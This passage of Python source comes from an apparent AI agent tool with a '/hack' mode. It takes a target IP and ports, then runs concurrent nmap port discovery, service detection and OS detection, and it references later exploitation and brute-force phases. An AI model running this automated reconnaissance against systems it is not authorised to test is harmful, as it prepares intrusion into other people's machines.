        body.update(custom_params)

    def _noop(_piece):        # suppress streaming; we print the message once, clean
        pass
    try:
        result = _chat_stream(endpoint, api_key, body, _noop,
                              hide_thinking=hide_thinking)
    except Exception:
        return _HACK_ANNOUNCEMENT
    text = (result.get("content") or "").strip()
    if not text or text.startswith("[tool loop]"):   # empty / HTTP-error marker
        return _HACK_ANNOUNCEMENT
    return text


def _run_hack(ctx: dict, base_dir: str, history: list, mcp, debug: bool):
    """/hack — enable hacking mode. Confirm, pick the objective, then print a static
    English announcement (no LLM — small models are unreliable at this) and ask for
    the target IP as step 1. Returns (announcement, goal_shortcode) if enabled — the
    caller waits for the IP next; (None, None) if declined/cancelled/no model."""
    console.print(Text("  ⚠ enable hacking mode? [y/N] ", style="yellow"), end="")
    try:
        ans = input().strip().lower()
    except (EOFError, KeyboardInterrupt):
        ans = ""
    if ans not in ("y", "yes"):
        console.print(Text("      cancelled", style="bright_black"))
        return None, None

    profile = ctx.get("profile")
    if not profile:
        console.print("  [yellow]No model selected.[/yellow] Type "
                      "[cyan]/model[/cyan] to choose one first.")
        return None, None

    # Objective for this engagement (arrow keys). Cancelling here cancels enabling.
    goal = _select_hack_goal()
    if goal is None:
        console.print(Text("      cancelled", style="bright_black"))
        return None, None
    _label, _hint, code = goal
    console.print()
    # Static English announcement — no LLM (small models are unreliable at this).
    console.print(Text(_HACK_ANNOUNCEMENT, style=VIOLET))
    for cmd, desc in (("/hack", "again to turn hacking mode off"),
                      ("/stop", "to pause the agent"),
                      ("/start", "to start or resume the engagement"),
                      ("/status", "to check"),
                      ("btw <question>", "to ask the model")):
        line = Text("  ", style="bright_black")
        line.append(cmd, style="cyan")
        line.append(" " + desc, style="bright_black")
        console.print(line)
    console.print()
    # step 1 (the target IP) is entered inline at the REPL prompt (see run_repl).
    return _HACK_ANNOUNCEMENT, code


# ── /hack — target intake (structured extraction into purragent.db) ────────────
# When the user answers the "tell me about the target" prompt, one forced function
# call groups their free text into DB fields. The user's message is a real final
# user turn, so the empty-response problem the intro had (ending on assistant)
# doesn't apply here — a plain forced tool call is reliable. Whatever the model
# misses is still kept verbatim as a raw-intake note, so nothing is lost.

# Schema is deliberately FLAT (top-level scalars, ports as a plain integer list,
# shallow 2-field objects) — small models (qwen3-14b) reliably fill flat fields but
# drop deeply-nested arrays-of-objects, extracting only the IP. A worked example in
# _RECORD_SYS pins the mapping.
_RECORD_TARGET_TOOL = {
    "type": "function",
    "function": {
        "name": "record_target",
        "description": (
            "Store what the user just told you about the single engagement target. "
            "Fill EVERY field the user mentioned — the ports, the service on a port "
            "and the credentials matter as much as the IP; do NOT stop after the IP. "
            "Extract only facts the user actually stated; never invent or guess."),
        "parameters": {
            "type": "object",
            "properties": {
                "ip":       {"type": "string", "description": "target IP address"},
                "hostname": {"type": "string"},
                "url":      {"type": "string"},
                "os":       {"type": "string"},
                "platform": {"type": "string",
                             "description": "linux / windows / ad / web / other"},
                "ports": {
                    "type": "array",
                    "description": "Every port NUMBER the user mentioned.",
                    "items": {"type": "integer"},
                },
                "services": {
                    "type": "array",
                    "description": "Which service runs on which port.",
                    "items": {
                        "type": "object",
                        "properties": {
                            "port": {"type": "integer"},
                            "name": {"type": "string"},
                        },
                        "required": ["port", "name"],
                    },
                },
                "credentials": {
                    "type": "array",
                    "description": "Username/password pairs the user has.",
                    "items": {
                        "type": "object",
                        "properties": {
                            "username": {"type": "string"},
                            "secret":   {"type": "string"},
                            "type":     {"type": "string",
                                         "description": "password/hash/ssh_key/token"},
                        },
                        "required": ["username"],
                    },
                },
                "paths": {
                    "type": "array",
                    "description": "Known web paths / URLs / endpoints.",
                    "items": {"type": "string"},
                },
                "notes": {
                    "type": "string",
                    "description": "Anything relevant that doesn't fit the fields above.",
                },
                "other_targets": {
                    "type": "array",
                    "description": (
                        "Extra DISTINCT hosts if the user described more than one "
                        "(the first goes in `ip`). The SAME host's IP + hostname + "
                        "URL are ONE target — do not list those."),
                    "items": {"type": "string"},
                },
            },
        },
    },
}

_RECORD_SYS = (
    "The user is describing the target for an authorised offensive engagement. "
    "Hacking mode handles ONE target at a time. Call record_target and fill EVERY "
    "detail the user gave — the ports, the service on a port and the credentials "
    "matter as much as the IP; do NOT stop after the IP. Extract only what the user "
    "actually said; never invent. If they gave several distinct hosts, put the "
    "first in `ip` and the rest in `other_targets`.\n\n"
    "Example — user says: 'ip 1.2.3.4 ports 22 80 445, http on 80, creds "
    "bob:hunter2' → ip=\"1.2.3.4\", ports=[22,80,445], "
    "services=[{\"port\":80,\"name\":\"http\"}], "
    "credentials=[{\"username\":\"bob\",\"secret\":\"hunter2\"}]."
)


def _extract_target(profile: dict, base_dir: str, target_text: str,
                    debug: bool) -> dict | None:
    """One forced record_target(...) call that groups the user's free-text target
    description into structured fields. Returns the parsed args dict, or None."""
    endpoint, api_key = _openai_endpoint(profile, base_dir)
    model         = profile.get("model", "")
    custom_params = psai._parse_custom_params(profile)
    hide_thinking = bool(profile.get("hide_thinking", False))

    messages = [{"role": "system", "content": PURRAGENT_SYSTEM + "\n\n"
                 + _env_block() + "\n\n" + _RECORD_SYS},
                {"role": "user", "content": target_text + "\n\n/no_think"}]
    body = {"model": model, "messages": messages, "temperature": AGENT_TEMPERATURE,
            "tools": [_RECORD_TARGET_TOOL],
            "tool_choice": {"type": "function",
                            "function": {"name": "record_target"}}}
    if custom_params:
        body.update(custom_params)

    def _noop(_piece):
        pass
    try:
        result = _chat_stream(endpoint, api_key, body, _noop,
                              hide_thinking=hide_thinking)
    except Exception:
        return None
    for tc in (result.get("tool_calls") or []):
        try:
            return json.loads(tc.get("function", {}).get("arguments") or "{}")
        except json.JSONDecodeError:
            continue
    return None


def _record_target(ctx: dict, base_dir: str, debug: bool,
                   target_text: str, goal) -> bool:
    """Validate the target IP the user entered (step 1). Valid → print SKELETON OK
    and return True (done); invalid → print an error and return False so the caller
    re-asks. Returns True once a valid IP is accepted.

    NOTE: the DB integration (LLM extraction + purragent.db) is disabled for now —
    the small local model is unreliable at structured extraction. It is kept
    commented out below to wire back in later."""
    ip = target_text.strip()
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        console.print(Text("  ⚠ not a valid IP address — enter a single target IP "
                           "(e.g. 10.10.10.5)", style="yellow"))
        return False

    # Step 2 — known open ports (optional, validated). Enter with no input = none;
    # any invalid token (non-numeric or out of 1-65535) re-prompts the whole line.
    ports = []
    while True:
        try:
            raw = input("  step 2 — known open ports (comma/space separated, "
                        "Enter for none): ").strip()
        except (EOFError, KeyboardInterrupt):
            raw = ""
        if not raw:
            ports = []
            break
        ports, bad = [], []
        for tok in (t for t in re.split(r"[\s,]+", raw) if t):
            try:
                p = int(tok)
            except ValueError:
                bad.append(tok)
                continue
            if not (1 <= p <= 65535):
                bad.append(tok)
            elif p not in ports:
                ports.append(p)
        if bad:
            console.print(Text("  ⚠ invalid port(s): " + ", ".join(bad)
                               + " — use port numbers 1-65535", style="yellow"))
            continue          # re-ask the whole line
        break
    if ports:
        console.print(Text("    ports: " + ", ".join(str(p) for p in ports),
                           style="bright_black"))

    # Store the validated IP + entered ports directly (no LLM — the data comes
    # straight from the user). /target renders it (host → ports → detail).
    # The richer LLM extraction (_extract_target / record_target) stays disabled.
    try:
        purragent_db.save_engagement(base_dir, goal, {"ip": ip, "ports": ports}, "")
    except Exception as e:
        console.print(f"  [red]could not save the target:[/red] [dim]{e}[/dim]")
        return False

    # Short summary of what went into the DB (default colour, like the step prompts).
    console.print()
    console.print(Text("  recorded to the target database:"))
    console.print(Text(f"    ip:         {ip}"))
    console.print(Text("    ports:      "
                       + (", ".join(str(p) for p in ports) if ports else "(none)")))
    console.print(Text(f"    objective:  {goal}"))
    console.print()

    # Confirm before starting the engagement — yellow, like the enable prompt.
    console.print(Text(f"  start hacking with objective '{goal}'? [y/N] ",
                       style="yellow"), end="")
    try:
        ans = input().strip().lower()
    except (EOFError, KeyboardInterrupt):
        ans = ""
    if ans in ("y", "yes"):
        _start_hacking(ctx, base_dir, goal)
    else:
        hint = Text("      not started — use ", style="bright_black")
        hint.append("/target", style="cyan")
        hint.append(" to review, ", style="bright_black")
        hint.append("/start", style="cyan")
        hint.append(" to begin", style="bright_black")
        console.print(hint)
    return True


# Port-discovery time budget, mirroring pshunter's DEFAULT_MINUTES (Enter default).
PORT_SCAN_MINUTES = 10
EXPLOIT_CMD_MINUTES = 3        # per-command time budget in phase 5 (service exploitation)


def _port_scan_specs() -> list:
    """(label, nmap-args) for the concurrent port scans, mirroring pshunter: a fast
    top-1000 pass lands ports early while full low/high sweeps finish; UDP is added
    only as root. SYN scan needs root, else a TCP connect scan."""
    tcp = "-sS" if _is_root() else "-sT"
    specs = [
        ("fast",    [tcp, "-n", "--open", "-T4", "--top-ports", "1000"]),
        ("full-lo", [tcp, "-n", "--open", "-T3", "-p", "1-32767"]),
        ("full-hi", [tcp, "-n", "--open", "-T3", "-p", "32768-65535"]),
    ]
    if _is_root():
        specs.append(("udp", ["-sU", "-n", "--open", "-T4", "--top-ports", "100"]))
    return specs


def _spec_commands(specs: list, ip: str) -> list:
    """Human-readable `nmap …` command per scan spec (drops the -oX output flag), for
    the /status view."""
    cmds = []
    for _label, args in specs:
        shown, skip = [], False
        for a in args:
            if skip:
                skip = False
                continue
            if a == "-oX":                       # hide -oX - (output plumbing)
                skip = True
                continue
            shown.append(a)
        cmds.append("nmap " + " ".join(shown) + " " + ip)
    return cmds


def _run_one_port_pass(args: list, ip: str, proto: str, cancel) -> dict:
    """Run ONE port-scan pass (of _port_scan_specs) and return its open ports for the
    given proto. Cancellable + time-budgeted; keeps partial output. Used by the
    streaming pipeline so each pass reports as soon as it finishes.
    Returns {ok, ports:[int], cancelled, timed_out, down, error}."""
    deadline = PORT_SCAN_MINUTES * 60
    try:
        proc = subprocess.Popen(["nmap"] + args + [ip], stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, text=True)
    except FileNotFoundError:
        return {"ok": False, "ports": [], "cancelled": False, "timed_out": False,
                "down": False, "error": "nmap not installed"}
    start, timed_out = time.time(), False
    while proc.poll() is None:
        if cancel is not None and cancel.is_set():
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
            break
        if (time.time() - start) > deadline:
            timed_out = True
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
            break
        time.sleep(0.3)
    try:
        out, _err = proc.communicate(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _err = proc.communicate()
    except Exception:                             # noqa: BLE001
        out = ""
    out = out or ""
    ports = sorted({int(m.group(1))
                    for m in re.finditer(rf"(\d+)/{proto}\s+open", out)})
    down = "0 hosts up" in out or "Host seems down" in out
    return {"ok": True, "ports": ports,
            "cancelled": bool(cancel is not None and cancel.is_set()),
            "timed_out": timed_out, "down": down, "error": ""}


def _run_port_scan(ip: str, cancel=None, force_pn: bool = False,
                   quick: bool = False) -> dict:
    """Run the port-discovery scans on one host, concurrently (like pshunter), each
    capped at the default time budget. `cancel` (a threading.Event) is polled to
    terminate the running nmap processes early (/stop); partial output is kept.
    `force_pn` prepends -Pn (assume the host is up — the deterministic retry after
    an 'unreachable' verdict, for firewalled hosts). `quick` runs only the fast pass.
    Returns {ok, reachable, ports:[int], cancelled, timed_out, error}."""
    specs = _port_scan_specs()
    if quick:
        specs = specs[:1]
    if force_pn:
        specs = [(label, ["-Pn"] + args) for label, args in specs]
    results: list = [None] * len(specs)
    hit_deadline: list = [False] * len(specs)
    deadline = PORT_SCAN_MINUTES * 60

    def _pass(i: int, args: list) -> None:
        try:
            proc = subprocess.Popen(["nmap"] + args + [ip],
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    text=True)
        except FileNotFoundError:
            results[i] = "\x00missing"
            return
        start = time.time()
        while proc.poll() is None:
            if cancel is not None and cancel.is_set():
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                break
            if (time.time() - start) > deadline:     # hit the time budget
                hit_deadline[i] = True
                proc.terminate()                     # graceful → hard kill (pshunter)
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                break
            time.sleep(0.3)
        try:
            out, err = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, err = proc.communicate()
        except Exception:                        # noqa: BLE001
            out, err = "", ""
        results[i] = (out or "") + (err or "")   # partial output is kept

    threads = [threading.Thread(target=_pass, args=(i, args), daemon=True)
               for i, (_label, args) in enumerate(specs)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    cancelled = bool(cancel is not None and cancel.is_set())
    timed_out = any(hit_deadline)
    outs = [r for r in results if r and not r.startswith("\x00")]
    if not outs:                                  # every pass failed to run
        err = ("nmap not installed" if all(r == "\x00missing" for r in results)
               else "scan error")
        return {"ok": False, "reachable": False, "ports": [],
                "cancelled": cancelled, "timed_out": timed_out, "error": err}

    combined = "\n".join(outs)
    ports = sorted({int(m.group(1))
                    for m in re.finditer(r"(\d+)/tcp\s+open", combined)})
    # -Pn always treats the host as up, so we can't call it 'down' then; otherwise
    # down only if every pass agrees the host is down and none found ports.
    down = (not force_pn
            and all(("0 hosts up" in o or "Host seems down" in o) for o in outs))
    reachable = bool(ports) or not down
    return {"ok": True, "reachable": reachable, "ports": ports,
            "cancelled": cancelled, "timed_out": timed_out, "error": ""}


def _job(command: str) -> dict:
    return {"command": command, "state": "running", "cancel": threading.Event()}


def _phase_banner(n: int, name: str, budget: bool = True, minutes=None,
                  num=None, cmd=None) -> "Text":
    """Uniform phase header: a [running] tag (with the command's number when a phase
    runs several, so you can pair it with its [complete N] line), plus the time
    budget (skipped for the offline CVE lookup). When `cmd` is given, the actual
    command run is shown as a dimmed subline (like the exploit `$ …` lines), so the
    user can see and reproduce exactly what was executed."""
    b = Text("  ", style="bright_black")               # whole line dimmed
    b.append("[running" + (f" {num}" if num else "") + "]", style="default")
    b.append(f" ▸ {name}", style="bright_black")
    if budget:
        b.append(f"  ·  ⏱ {minutes or PORT_SCAN_MINUTES}m budget",
                 style="bright_black")
    if cmd:
        b.append("\n        $ " + cmd, style="bright_black")
    return b


# Phases that fan out into several concurrent commands announce each one separately:
# a [running] header when it starts, then a complete line + its own findings when it
# finishes. Friendly per-command labels below.
_PORT_PASS_LABEL = {
    "fast": "fast port discovery",
    "full-lo": "full low ports discovery",
    "full-hi": "full high ports discovery",
    "udp": "udp port discovery",
}


def _pass_label(label: str) -> str:
    return _PORT_PASS_LABEL.get(label, f"{label} port discovery")


def _next_seq(eng: dict) -> int:
    """Next engagement-wide command number, so [running N]/[complete N] increase
    monotonically across ALL phases (each command keeps the N it was announced with)."""
    with eng["lock"]:
        eng["seq"] = eng.get("seq", 0) + 1
        return eng["seq"]


_STATE_TAG = {"complete": ("complete", "default"),    # normal, like the rest of the line
              "error": ("failed", "red"),
              "aborted": ("aborted", "magenta")}


def _phase_state_line(n: int, label: str, state: str, num=None) -> "Text":
    """The finished-state header: a coloured [complete N]/[failed N]/[aborted N] tag
    in the same convention as the [running N] banner (N pairs it with its start)."""
    word, color = _STATE_TAG.get(state, (state, "yellow"))
    out = Text("  ")
    out.append("[" + word + (f" {num}" if num else "") + "]", style=color)
    out.append(f" ▸ {label}")
    return out


def _print_cmd_outcome(n: int, label: str, state: str, findings: str,
                       num=None) -> None:
    """Per-command completion line + its own findings (one scan of a multi-command
    phase). Printed as a single Text so the two lines can't interleave with another
    command finishing at once."""
    out = _phase_state_line(n, label, state, num=num)
    if state == "complete":
        out.append("\n    ")
        out.append(f"{label} findings: {findings or 'none'}",
                   style="green" if findings else "bright_black")
    console.print(out)


def _post(ctx: dict, fn) -> None:
    """Queue a print to appear above the active prompt (from a worker thread). One
    run_in_terminal render is scheduled per burst (deduped via _flush_scheduled) —
    _flush_pending drains everything queued so far, so N rapid posts cause ONE
    erase/redraw of the prompt, not N (which used to occasionally drop the toolbar).
    The REPL loop flushes any that don't make it in time."""
    ctx.setdefault("pending", []).append(fn)
    if ctx.get("_flush_scheduled"):
        return
    try:
        from prompt_toolkit.application import get_app_or_none, run_in_terminal
        app = get_app_or_none()
        loop = getattr(app, "loop", None) if app is not None else None
        if loop is not None:
            ctx["_flush_scheduled"] = True
            loop.call_soon_threadsafe(
                lambda: run_in_terminal(lambda: _flush_pending(ctx)))
    except Exception:
        ctx["_flush_scheduled"] = False


def _flush_pending(ctx: dict) -> None:
    ctx["_flush_scheduled"] = False
    pend, ctx["pending"] = ctx.get("pending") or [], []
    for fn in pend:
        try:
            fn()
        except Exception:
            pass


def _invalidate_toolbar(ctx: dict) -> None:
    """Ask the active prompt to redraw (updates the toolbar tag) without printing —
    used when a background state like 'thinking' changes with no output to post."""
    try:
        from prompt_toolkit.application import get_app_or_none
        app = get_app_or_none()
        if app is not None:
            app.loop.call_soon_threadsafe(app.invalidate)
    except Exception:
        pass


def _cancel_engagement(ctx: dict, include_background: bool = False) -> None:
    """Stop all in-flight pipeline scans (kills their nmap) and mark the engagement
    cancelled so it won't advance. Background phases (the fire-and-forget brute-force
    jobs) survive the end-of-run auto-stop and are only killed on an explicit /stop
    (include_background=True)."""
    eng = ctx.get("engagement")
    if eng:
        eng["cancelled"] = True
    for ph in ctx.get("phases", []):
        if ph.get("background") and not include_background:
            continue
        for job in ph.get("jobs", []):
            c = job.get("cancel")
            if c is not None:
                c.set()


def _brute_running(ctx: dict) -> bool:
    """True while any background brute-force job is still in flight."""
    for ph in ctx.get("phases", []):
        if ph.get("background") and any(j.get("state") == "running"
                                        for j in ph.get("jobs", [])):
            return True
    return False


def _start_port_discovery(ctx: dict, base_dir: str, target: dict) -> None:
    """Hacking loop entry — a STREAMING pipeline (no LLM): the phase-1 port passes run
    concurrently and, as soon as the fast pass lands (or after 15s), phase-2 service
    detection starts on the ports found so far; each later pass that discovers NEW
    ports triggers service detection for just those. Phase 3 is reached once every
    pass has finished and every discovered port is service-detected. All background,
    so btw / /status / /stop work meanwhile."""
    ip, tid = target.get("ip"), target["id"]
    pre = {p["port"] for p in purragent_db.fetch_ports(base_dir, tid)}
    specs = _port_scan_specs()
    port_phase = {"phase": "port discovery", "ip": ip,
                  "jobs": [_job(c) for c in _spec_commands(specs, ip)]}
    eng = {
        "lock": threading.Lock(), "ctx": ctx, "base_dir": base_dir, "tid": tid,
        "ip": ip, "started": time.time(), "pre_ports": pre,
        "discovered_tcp": set(pre), "discovered_udp": set(),
        "detected_tcp": set(), "detected_udp": set(),
        "down_flags": [], "timed_out": False, "failed": False, "cancelled": False,
        "retried_pn": False, "os_done": False, "fast_done": False,
        "port_done": False, "port_finalised": False, "port_settled": False,
        "advanced": False,
        "port_phase": port_phase, "svc_phase": None,
        "svc_services": [], "svc_scripts": [], "os": None,
        "vuln_phase": None, "vuln_findings": [], "vuln_advanced": False,
        "cve_phase": None, "cve_results": [], "cve_no_index": False,
        "exploit_phase": None, "exploit_findings": [],
        "thinking": False, "recon_done": False, "seq": 0,
    }
    ctx["engagement"] = eng
    ctx["phases"] = [port_phase]

    for i, ((label, args), job) in enumerate(zip(specs, port_phase["jobs"]), 1):
        proto = "udp" if label == "udp" else "tcp"
        n = _next_seq(eng)
        console.print(_phase_banner(1, _pass_label(label), num=n,
                                    cmd=job["command"]))          # announce each pass
        threading.Thread(target=_port_pass, args=(eng, label, args, proto, job, n),
                         daemon=True).start()
    threading.Timer(15.0, lambda: _svc_trigger(eng, "15s")).start()


def _port_pass(eng: dict, label: str, args: list, proto: str, job: dict,
               num: int) -> None:
    """One phase-1 port pass; on completion, stream its ports into the pipeline."""
    result = _run_one_port_pass(args, eng["ip"], proto, job["cancel"])
    fire, done = False, False
    with eng["lock"]:
        key = "discovered_" + proto
        newp = set(result["ports"]) - eng[key]
        try:
            for p in newp:
                purragent_db.add_service(eng["base_dir"], eng["tid"], p, proto)
        except Exception:
            pass
        eng[key] |= set(result["ports"])
        if result["cancelled"]:
            job["state"], eng["cancelled"] = "aborted", True
        elif not result["ok"]:
            job["state"] = "error"
            if result.get("error") == "nmap not installed":
                eng["failed"] = True
        else:
            job["state"] = "complete"
        if result.get("timed_out"):
            eng["timed_out"] = True
        eng["down_flags"].append(bool(result.get("down")) and not result["ports"])
        if label == "fast":
            eng["fast_done"] = True
        eng["port_done"] = all(j["state"] != "running"
                               for j in eng["port_phase"]["jobs"])
        done = eng["port_done"] and not eng["port_finalised"]
        if done:
            eng["port_finalised"] = True
        fire = (label == "fast" or bool(newp)) and not result["cancelled"]
        st = job["state"]
        new_ports = sorted(newp)                       # only ports not already in the DB
    finds = ", ".join(str(p) for p in new_ports)
    _post(eng["ctx"], lambda l=label, s=st, f=finds, nm=num:
          _print_cmd_outcome(1, _pass_label(l), s, f, num=nm))
    if fire:
        _svc_trigger(eng, "pass")
    if done:
        _finalise_port_discovery(eng)
    _maybe_advance(eng)


def _finalise_port_discovery(eng: dict) -> None:
    """All port passes done: if nothing was found and the host looked down, run one
    -Pn retry (firewalled hosts) as its own announced command."""
    with eng["lock"]:
        have = bool(eng["discovered_tcp"] - eng["pre_ports"]) or bool(eng["discovered_udp"])
        all_down = all(eng["down_flags"]) if eng["down_flags"] else False
        retry = (not have and all_down and not eng["retried_pn"]
                 and not eng["cancelled"])
        if not retry:
            eng["port_settled"] = True     # nothing more to do → advance may proceed
            return
        eng["retried_pn"] = True
        rjob = _job("nmap -Pn --top-ports 1000 " + eng["ip"] + "  (firewall retry)")
        eng["port_phase"]["jobs"].append(rjob)
        eng["seq"] = eng.get("seq", 0) + 1             # under lock → inline (no re-lock)
        rnum = eng["seq"]
    _post(eng["ctx"], lambda c=rjob["command"]: console.print(
        _phase_banner(1, "firewall-retry port discovery", num=rnum, cmd=c)))
    tcp = "-sS" if _is_root() else "-sT"
    r = _run_one_port_pass(["-Pn", tcp, "-n", "--open", "-T4", "--top-ports",
                            "1000"], eng["ip"], "tcp", rjob["cancel"])
    with eng["lock"]:
        newp = set(r["ports"]) - eng["discovered_tcp"]
        try:
            for p in newp:
                purragent_db.add_service(eng["base_dir"], eng["tid"], p, "tcp")
        except Exception:
            pass
        eng["discovered_tcp"] |= set(r["ports"])
        rjob["state"] = ("aborted" if r["cancelled"]
                         else "error" if not r["ok"] else "complete")
        eng["port_settled"] = True         # retry done → advance may proceed
        st = rjob["state"]
        new_ports = sorted(newp)                        # only ports new to the DB
    finds = ", ".join(str(p) for p in new_ports)
    _post(eng["ctx"], lambda s=st, f=finds, nm=rnum:
          _print_cmd_outcome(1, "firewall-retry port discovery", s, f, num=nm))
    if r["ports"]:
        _svc_trigger(eng, "retry")


def _svc_trigger(eng: dict, reason: str) -> None:
    """Start service detection on ports discovered but not yet detected, once the fast
    pass has landed (or 15s passed). Each call handles a fresh batch of new ports."""
    with eng["lock"]:
        if eng["cancelled"]:
            return
        if not (eng["fast_done"] or (time.time() - eng["started"]) >= 15):
            return
        new_tcp = sorted(eng["discovered_tcp"] - eng["detected_tcp"])
        new_udp = sorted(eng["discovered_udp"] - eng["detected_udp"])
        if not new_tcp and not new_udp:
            return
        eng["detected_tcp"] |= set(new_tcp)
        eng["detected_udp"] |= set(new_udp)
        include_os = not eng["os_done"] and _is_root()
        if include_os:
            eng["os_done"] = True
        if eng["svc_phase"] is None:
            eng["svc_phase"] = {"phase": "service detection", "ip": eng["ip"],
                                "jobs": []}
            eng["ctx"].setdefault("phases", []).append(eng["svc_phase"])
        batch = new_tcp + new_udp
        shown = ", ".join(str(p) for p in batch[:8]) + ("…" if len(batch) > 8 else "")
        label = f"service detection ({shown})"
        cmd = ("nmap -sV -sC" + (" +OS" if include_os else "") + " -p "
               + ",".join(str(p) for p in batch) + " " + eng["ip"])
        job = _job(cmd)
        eng["svc_phase"]["jobs"].append(job)
        eng["seq"] = eng.get("seq", 0) + 1             # under lock → inline
        num = eng["seq"]
    _post(eng["ctx"], lambda l=label, nm=num, c=job["command"]:
          console.print(_phase_banner(2, l, num=nm, cmd=c)))
    threading.Thread(target=_svc_batch,
                     args=(eng, new_tcp, new_udp, include_os, job, label, num),
                     daemon=True).start()


def _svc_batch(eng: dict, tcp: list, udp: list, include_os: bool, job: dict,
               label: str, num: int) -> None:
    result = _run_service_scan(eng["ip"], tcp, udp, job["cancel"],
                               include_os=include_os)
    with eng["lock"]:
        try:
            for s in result.get("services", []):
                purragent_db.set_service(eng["base_dir"], eng["tid"], s["port"],
                                         s.get("proto") or "tcp", s.get("name"),
                                         s.get("product"), s.get("version"),
                                         s.get("cpe"))
            for sc in result.get("scripts", []):
                purragent_db.add_script(eng["base_dir"], eng["tid"], sc["port"],
                                        sc.get("proto") or "tcp", sc.get("script"),
                                        sc.get("output"))
            if result.get("os"):
                purragent_db.set_os(eng["base_dir"], eng["tid"], result["os"])
        except Exception:
            pass
        eng["svc_services"] += result.get("services", [])
        eng["svc_scripts"] += result.get("scripts", [])
        eng["os"] = eng["os"] or result.get("os")
        job["state"] = ("aborted" if result.get("cancelled")
                        else "error" if not result.get("ok") else "complete")
        st = job["state"]
    named = [s for s in result.get("services", [])
             if s.get("name") and s["name"] != "unknown"]
    finds = ", ".join(f"{s['port']}/{s['name']}" for s in named)
    if result.get("os"):
        finds += (("  ·  " if finds else "") + f"OS: {result['os']}")
    _post(eng["ctx"], lambda s=st, f=finds, nm=num:
          _print_cmd_outcome(2, label, s, f, num=nm))
    _maybe_advance(eng)


def _maybe_advance(eng: dict) -> None:
    """Advance to phase 3 once every port pass is done and every discovered port has
    been service-detected (nothing left in flight)."""
    with eng["lock"]:
        if eng["advanced"] or not eng["port_done"] or not eng["port_settled"]:
            return
        port_running = any(j["state"] == "running"
                           for j in eng["port_phase"]["jobs"])
        svc_running = bool(eng["svc_phase"]) and any(
            j["state"] == "running" for j in eng["svc_phase"]["jobs"])
        pending = (eng["discovered_tcp"] - eng["detected_tcp"]) or \
                  (eng["discovered_udp"] - eng["detected_udp"])
        if port_running or svc_running or pending:
            return
        eng["advanced"] = True
    _post(eng["ctx"], lambda: _finish_engagement(eng))


def _finish_engagement(eng: dict) -> None:
    with eng["lock"]:
        if eng["cancelled"]:
            return
        ports = eng["discovered_tcp"] | eng["discovered_udp"]
    if not ports:
        _pause_engagement(eng["ctx"])
        return
    _start_vuln_scan(eng)                          # phase 3 — vuln scan


def _parse_nmap_service_xml(xml_str: str) -> dict:
    """Parse `nmap -oX -` phase-2 output → {services, scripts, os}. services: per
    open port name/product/version; scripts: per-port NSE (-sC) output; os: the
    best-accuracy OS match."""
    import xml.etree.ElementTree as ET
    res = {"services": [], "scripts": [], "os": None}
    try:
        root = ET.fromstring(xml_str)
    except (ET.ParseError, TypeError):
        return res
    for host in root.iter("host"):
        for port in host.iter("port"):
            st = port.find("state")
            if st is None or st.get("state") != "open":
                continue
            try:
                pnum = int(port.get("portid"))
            except (TypeError, ValueError):
                continue
            proto = port.get("protocol", "tcp")
            svc = port.find("service")
            if svc is not None and (svc.get("name") or svc.get("product")):
                cpes = [c.text for c in svc.findall("cpe") if c.text]
                # prefer the application CPE (cpe:/a:) over an OS CPE for CVE lookup
                cpe = next((c for c in cpes if c.startswith("cpe:/a:")),
                           cpes[0] if cpes else None)
                res["services"].append({
                    "port": pnum, "proto": proto, "name": svc.get("name"),
                    "product": svc.get("product"), "version": svc.get("version"),
                    "cpe": cpe})
            for scr in port.findall("script"):
                out = scr.get("output")
                if out:
                    res["scripts"].append({"port": pnum, "proto": proto,
                                           "script": scr.get("id"),
                                           "output": out.strip()})
        osel = host.find("os")
        if osel is not None:
            best, acc = None, -1
            for m in osel.findall("osmatch"):
                try:
                    a = int(m.get("accuracy") or 0)
                except (TypeError, ValueError):
                    a = 0
                if a > acc:
                    best, acc = m.get("name"), a
            if best:
                res["os"] = best
    return res


def _service_scan_specs(tcp_ports: list, udp_ports: list,
                        include_os: bool = True) -> list:
    """(label, nmap-args) for phase-2 passes, mirroring pshunter: TCP -sV -sC; UDP
    -sU -sV (root); OS -O --osscan-guess as its own scan (root). `include_os=False`
    for follow-up batches so OS detection runs only once."""
    specs = []
    if tcp_ports:
        specs.append(("service", ["-sV", "-sC", "-Pn", "-n", "-T4", "-oX", "-",
                                   "-p", ",".join(str(p) for p in tcp_ports)]))
    if udp_ports and _is_root():
        specs.append(("service-udp", ["-sU", "-sV", "-Pn", "-n", "-T4", "-oX", "-",
                                      "-p", ",".join(str(p) for p in udp_ports)]))
    if include_os and _is_root():
        specs.append(("os", ["-O", "--osscan-guess", "-Pn", "-n", "-T4", "-oX", "-"]))
    return specs


def _run_service_scan(ip: str, tcp_ports: list, udp_ports: list, cancel=None,
                      include_os: bool = True) -> dict:
    """Phase 2 — service detection on the target, running pshunter's passes CONCURRENTLY
    (TCP -sV -sC, + UDP -sV and OS -O as root), each capped at the time budget and
    cancellable (/stop). Aggregates services/scripts/os across passes. Returns
    {ok, cancelled, timed_out, services, scripts, os, error}."""
    specs = _service_scan_specs(tcp_ports, udp_ports, include_os=include_os)
    if not specs:
        return {"ok": True, "cancelled": False, "timed_out": False,
                "services": [], "scripts": [], "os": None, "error": ""}
    results: list = [None] * len(specs)
    hit: list = [False] * len(specs)
    deadline = PORT_SCAN_MINUTES * 60

    def _pass(i: int, args: list) -> None:
        try:
            proc = subprocess.Popen(["nmap"] + args + [ip], stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True)
        except FileNotFoundError:
            results[i] = "\x00missing"
            return
        start = time.time()
        while proc.poll() is None:
            if cancel is not None and cancel.is_set():
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                break
            if (time.time() - start) > deadline:
                hit[i] = True
                proc.terminate()
                try:
                    proc.wait(timeout=3)
